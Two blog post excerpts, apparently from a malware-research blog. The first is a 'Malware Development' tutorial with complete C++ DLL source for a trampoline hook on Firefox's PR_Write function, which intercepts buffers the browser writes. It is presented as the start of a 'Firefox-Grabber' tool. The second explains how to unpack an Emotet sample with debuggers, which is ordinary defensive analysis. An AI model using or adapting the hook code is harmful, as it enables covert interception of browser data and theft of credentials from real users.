title: Malware Development: Writing a hook for mozilla
snippet: This post is about api hooking.We will take a look on how api hooking works at low level then implement our own hook on firefox process.Tools used: Cheat engine Complete code: Firefox-GrabberWhat’s api hooking ?Api hooking is a technique which lets you intercept API function calls and change it’s behavior. Windows Api hooking can be implemented in different ways such as the classic technique IAT hooks, Detours hooks, Trampoline hooks etc. In this post we will go trough Trampoline hooking, explain how it works and implement our own Trampoline hook.How Trampoline hook works?The trampline hook works by modifying directly the code of the target function and replace it by your own code then return to the original function to complete the function call. The picture below shows how the hook is placed and how the hooked function looked before and after hooking.The first step of Trampline Hook is overwriting the first 5 bytes of the function with a jmp instruction, the jmp opcode is 1 byte and the relative address we wanna jmp to ocupy 4 bytes (jmp opcode + relative address = 5 bytes), But before that we need to save our 5 overwritten bytes which we call stolen bytes for later use. After that we create our hooked function which accomplish our need then return to stolen bytes and finally jmp back right after the first modified bytes of the original function to continue the execution without crashing the target process.Writing a trampoline hook for firefoxLet’s implement what we learned and create a trampoline hook for mozilla firefox browser, the targeted function will be PR_Write. The Pr_Write function is responsible for writing buffers of data to a file or socket, if we hooked this function we could get some nusty infos from it so let’s start writing our hook code.Let’s begin with defining our functions prototypes and a type defintion for PR_Write function as follows.void* ProcAddress;void Detour(BYTE* src, BYTE* dst, int len);typedef int (*PR_Write)(void* fd, const void* buf, int amount);PR_Write old = (PR_Write)(ProcAddress);BYTE* Trampoline(BYTE* src, BYTE* dst, int len);The variable old is used to hold the address of the stolen bytes for later use after the hooking is done, the ProcAddress will be the address of the target function which is PR_Write.We move on to Trampoline function, it takes 3 arguments, src which will be ProcAddress, dst it’s our modified version of PR_Write function and finally the length of the stolen bytes in our case it should be 7 the first 5 bytes for jmp add instruction and filling the 2 remaining bytes with nop, as taking five bytes would corrupt the asm code and crash the browser.BYTE* Trampoline(BYTE* src, BYTE* dst, int len) { BYTE patch[5]; BYTE* addr = (BYTE*)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD written; memcpy_s(addr, len, src, len); uintptr_t gatewayrelative = src - addr - 5; memcpy_s(patch, 1, "\xE9", 1); *(uintptr_t*)(patch + 1) = gatewayrelative; WriteProcessMemory(GetCurrentProcess(), addr + len, patch, 5, &amp;written); Detour(src, dst, len); return addr;}We start the function by allocating memory with PAGE_EXECUTE_READWRITE permission as it will contain our stolen bytes follwed by a jmp to gateway_relative_address which point to PR_Write+7 and finally return the stolen byte address.The Detour function takes exactly arguments like the Trampoline function.void Detour(BYTE* src, BYTE* dst, int len) { BYTE patch[7]; DWORD written; DWORD readed; uintptr_t relative_addr = dst - src - 5; memcpy_s(patch, 1, "\xE9", 1); *(uintptr_t*)(patch + 1) = relative_addr; memset(patch + 5, 0x90, len - 5); WriteProcessMemory(GetCurrentProcess(), ProcAddress, patch, sizeof(patch), &amp;written);}Detour function it’s responsible for overwriting the original PR_Write function with a jmp to our fake function.We’re getting to close to finish our hook, we just need our fake function which is as follows.void DoStuf(char * info) { MessageBoxA(NULL,info,"TEXT",MB_OK);}int HookedPR_Write(void* fd, char* buf, int amount) { DoStuf(buf); return old(fd, buf, amount);}Now everything is fresh and ready to test, the whole code would look like#include &lt;Windows.h&gt; void* ProcAddress;void Detour(BYTE* src, BYTE* dst, int len);typedef int (*PR_Write)(void* fd, const void* buf, int amount);PR_Write old = (PR_Write)(ProcAddress);BYTE* Trampoline(BYTE* src, BYTE* dst, int len);using namespace std;void DoStuf(char * info) { MessageBoxA(NULL,info,"TEXT",MB_OK);}int HookedPR_Write(void* fd, char* buf, int amount) { DoStuf(buf); return old(fd, buf, amount);}BYTE* Trampoline(BYTE* src, BYTE* dst, int len) { BYTE patch[5]; BYTE* addr = (BYTE*)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD written; memcpy_s(addr, len, src, len); uintptr_t gatewayrelative = src - addr - 5; memcpy_s(patch, 1, "\xE9", 1); *(uintptr_t*)(patch + 1) = gatewayrelative; WriteProcessMemory(GetCurrentProcess(), addr + len, patch, 5, &amp;written); Detour(src, dst, len); return addr;}void Detour(BYTE* src, BYTE* dst, int len) { BYTE patch[7]; DWORD written; DWORD readed; uintptr_t relative_addr = dst - src - 5; memcpy_s(patch, 1, "\xE9", 1); *(uintptr_t*)(patch + 1) = relative_addr; memset(patch + 5, 0x90, len - 5); WriteProcessMemory(GetCurrentProcess(), ProcAddress, patch, sizeof(patch), &amp;written);}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ ProcAddress = (void*)GetProcAddress(LoadLibraryA("nss3.dll"), "PR_Write"); if (ul_reason_for_call == DLL_PROCESS_ATTACH) { if (ProcAddress != NULL) { old = (PR_Write)Trampoline((BYTE*)ProcAddress, (BYTE*)HookedPR_Write, 7); } } return TRUE;}Testing our hook on firefoxAnd Yaaaaay! our hook worked well.Reference Import Adress Table (IAT) Hooking Inline Hooking for Programmers (Part 1: Introduction) C++ Internal Trampoline Hook Tutorial - OpenGL Hook

title: Emotet Analysis Part 1: Unpacking
snippet: IntroductionThat’s will be my first post in the blog, i will make a series of posts about Emotet.Emotet is a Trojan that is primarily spread through spam emails (malspam), we’re going to digg deep in the anlysis of this Trojan, the first part is about unpacking the malware then we will try to analyse the different modules and techniques used by the malware to compromise a machine, so fire up your virtual machine and let’s start.TriageThe first thing i always do before opening a sample in IDA or Xdbg is opening the binary first in a hex editor, in my case i will use CFF Explorer, so opening the sample in CFF explorer shows that we’re dealing with 32 bit binary.Let’s check import section, the malware use only one library which is Kernel32 that’s the first sign which indicate that we’re dealing with packed binary.Two intersting API functions are used: VirtualAlloc VirtualProtectThe VirtualAlloc function allocate memory while the VirtualProtect function changes the protection on a region of committed pages in the virtual address space, most of time those two functions are used by malware during the unpacking process. To make sure that our sample is packed Let’s open the binary on Die(Detect-It-Easy).The status bar says that it’s 91% packed and .text section has a high entropy, that’s a strong indication that the malware is packed and we should unpack it for further analysis.IDANow that we’re sure that our sample is packed, let’s open it in IDA and try to find the function which is responsible for unpacking.Click on Imports to reveal all the functions used by the binary.Search for VirtualAlloc and double click on it.VirtualAlloc function is used two times by the same function sub_1001AFF0, double click on sub_1001AFF0 and scroll down we notice that the first function called after VirtualAlloc is sub_10022C40, so maybe we’ve found our unpacking function. to make sure let’s open it on Xdbg and figure out.UnpackingOpen your X32dbg and paste and paste your sample to it.Place a breakpoint on VirtualAlloc and hit run.Xdbg will keep running untill it hit the breakpoint, after click two times on Execute till run.Check the EAX register it contain the return adress address of the allocated memory by VirtualAlloc, right click on that value and click on Follow in Dump.As we said earlier that the function after VirtualAlloc is responsible for unpacking, step over it and keep your eyes on the dump window at the bottom.After executing sub_10022C40 function we can finally see our unpacked malware, dump it and save it somewhere in your machine.Right click on dump windows and Follow in memory map.Another right click on the address of the unpacked binary then Dump memory to file.Now that we have our sample unpacked and ready for analysis let’s open it in X32dbg.It seems that our unpacked binary is missed and it should be fixed.FixingTo fix the unpacked binary there are several methods to do that, we will use LordPE to automate the fixing, so all we should do is to open LordPe and click on options, then uncheck Wipe Relocation and Rebuild ImportTable options, finally click on normal then OK.Drag your unpacked sample to LordPe and it will be fixed automatically.Finally open your fixed binary in X32dbg and notice that it’s more readble right now.Reference New Emotet 11/2021 - Reverse Engineering VBA Obfuscation + Unpacking How to Unpack Malware with x64dbg
